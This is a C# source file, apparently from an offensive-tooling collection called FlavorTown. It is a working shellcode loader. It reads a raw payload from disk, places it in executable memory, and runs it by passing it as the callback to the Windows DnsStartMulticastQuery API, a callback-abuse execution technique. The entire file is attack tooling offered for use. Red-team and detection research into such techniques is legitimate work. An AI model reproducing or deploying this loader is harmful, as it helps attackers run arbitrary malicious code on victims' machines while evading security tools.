// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace DnsStartMulticastQuery
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: DnsStartMulticastQuery.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            uint DNS_QUERY_REQUEST_VERSION1 = 0x1;
            ushort DNS_TYPE_ZERO = 0x0;
            UInt64 DNS_QUERY_STANDARD = 0x0;

            MDNS_QUERY_REQUEST sMDNS = new MDNS_QUERY_REQUEST();
            sMDNS.Version = DNS_QUERY_REQUEST_VERSION1;
            sMDNS.ulRefCount = 0;
            sMDNS.Query = "Wra7h"; //Doesn't seem to matter
            sMDNS.QueryType = DNS_TYPE_ZERO;
            sMDNS.QueryOptions = DNS_QUERY_STANDARD;
            sMDNS.InterfaceIndex = 0;
            sMDNS.pQueryCallback = hAlloc;
            sMDNS.pQueryContext = IntPtr.Zero;


            MDNS_QUERY_HANDLE sMDNSHandle = new MDNS_QUERY_HANDLE();

            DnsStartMulticastQuery(sMDNS, out sMDNSHandle);
            DnsStopMulticastQuery(ref sMDNSHandle);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        public struct MDNS_QUERY_REQUEST
        {
            public uint Version;
            public uint ulRefCount;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string Query;
            public ushort QueryType;
            public UInt64 QueryOptions;
            public uint InterfaceIndex;
            public IntPtr pQueryCallback;
            public IntPtr pQueryContext;
            public bool fAnswerReceived;
            public uint ulResendCount;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct MDNS_QUERY_HANDLE
        {
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)] 
            public string nameBuf;
            public ushort wType;
            public IntPtr pSubscription;
            public IntPtr pWnfCallbackParams;
            public ulong stateNameData;
        }

        [DllImport("dnsapi.dll")]
        public extern static long DnsStartMulticastQuery(
            MDNS_QUERY_REQUEST pQueryRequest,
            out MDNS_QUERY_HANDLE pHandle);

        [DllImport("dnsapi.dll")]
        public extern static long DnsStopMulticastQuery(
            ref MDNS_QUERY_HANDLE pHandle);
    }
}
